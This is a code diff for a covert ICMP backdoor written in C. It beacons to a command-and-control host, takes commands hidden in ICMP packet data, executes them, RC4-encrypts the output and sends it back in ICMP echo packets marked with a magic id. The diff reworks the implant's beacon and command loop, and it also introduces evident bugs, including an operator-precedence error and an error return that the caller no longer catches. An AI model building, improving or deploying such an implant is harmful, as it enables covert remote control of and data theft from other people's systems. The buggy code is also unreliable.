@@ -73,7 +73,7 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
     buffer = malloc(sizeof(char) * temp_buffer_size);
     CHECK_ALLOC(buffer);
 
-    memmove(buffer, (char *) temp_buffer, temp_buffer_size);
+    strncpy(buffer, (char *) temp_buffer, temp_buffer_size);
 
     // encrypt the output
     rc4((unsigned char *) buffer, temp_buffer_size, (unsigned char *) KEY, KEY_LENGTH, output);
@@ -86,15 +86,14 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
 }
 
 // reads from the socket and put it in the buffer
-int read_from_socket(int sockfd, unsigned char *buffer, int size) {
-    int bytes_num = read(sockfd, buffer, size);
+ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
+    ssize_t nbytes = read(sockfd, buffer, size);
 
-    if (bytes_num < 0) {
-        perror("read()");
-        return 0;
+    if (nbytes < 0) {
+        return -1;
     }
 
-    return 1;
+    return nbytes;
 }
 
 // sends a beacon to the C2 with the magic byte
@@ -150,7 +149,7 @@ void interact(int sockfd, char *dest_ip) {
     unsigned char *output; // holds the output of the command
     unsigned char *packet; // holds the packet
     struct sockaddr_in addr;
-    size_t bytes_num, packet_size, output_size;
+    size_t nbytes, packet_size, output_size;
 
     output = malloc(sizeof(unsigned char) * BUFFER_SIZE);
     CHECK_ALLOC(output);
@@ -160,11 +159,10 @@ void interact(int sockfd, char *dest_ip) {
 
     // allocating a buffer to store the recieved ICMP packet
     packet = malloc(sizeof(unsigned char) * packet_size);
-    CHECK_ALLOC(packet)
+    CHECK_ALLOC(packet);
 
     while (1) {
-        // send a beacon and wait for commands
-        // gotta figure out how to better control it
+        // send a beacon and wait
         send_beacon(sockfd, dest_ip);
 
         if (!read_from_socket(sockfd, packet, packet_size)) {
@@ -172,37 +170,54 @@ void interact(int sockfd, char *dest_ip) {
             exit(EXIT_FAILURE);
         }
 
-        ip = (struct iphdr *) packet;
         icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
+        if (check_magic_byte(icmp)) {
+            break;
+        }
+    }
 
-        // set the IP & ICMP headers for later usage
-        addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = ip->saddr;
-        icmp->type = 0;
-
-        // get the data section (ignoring the IP & ICMP headers)
-        data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
-        data[BUFFER_SIZE] = '\0';
-
-        // invoke the command
-        output_size = invoke_command(data, output);
-
-        // put the output in the data section of the ICMP packet
-        memcpy(data, output, output_size);
-
-        // calculate the checksum
-        icmp->checksum = 0; // needs to be set before calculating for some weird reason
-        icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + output_size);
-
-        // send it
-        bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr) + output_size, 0, (struct sockaddr *) &addr, sizeof(addr));
-        if (bytes_num < 0) {
-            perror("sendto()");
+    while (1) {
+        if ((nbytes = read_from_socket(sockfd, packet, packet_size) < 0)) {
             break;
         }
 
-        // clean up the packet buffer for the next usage
-        memset(packet, '\0', packet_size);
+        ip = (struct iphdr *) packet;
+        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
+
+        if (check_magic_byte(icmp)) {
+            // set the IP & ICMP headers for later usage
+            addr.sin_family = AF_INET;
+            addr.sin_addr.s_addr = ip->saddr;
+            icmp->type = 0;
+
+            // get the data section (ignoring the IP & ICMP headers)
+            data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
+            data[BUFFER_SIZE] = '\0';
+
+            // invoke the command
+            output_size = invoke_command(data, output);
+
+            // put the output in the data section of the ICMP packet
+            memcpy(data, output, output_size);
+
+            // calculate the checksum
+            icmp->checksum = 0; // needs to be set before calculating for some weird reason
+            icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + output_size);
+
+            // add the magic byte
+            icmp->type = 8;
+            icmp->un.echo.id = 9001;
+
+            // send it
+            nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + output_size, 0, (struct sockaddr *) &addr, sizeof(addr));
+            if (nbytes < 0) {
+                perror("sendto()");
+                break;
+            }
+
+            // clean up the packet buffer for the next usage
+            memset(packet, '\0', packet_size);
+        }
     }
 
     free(output);
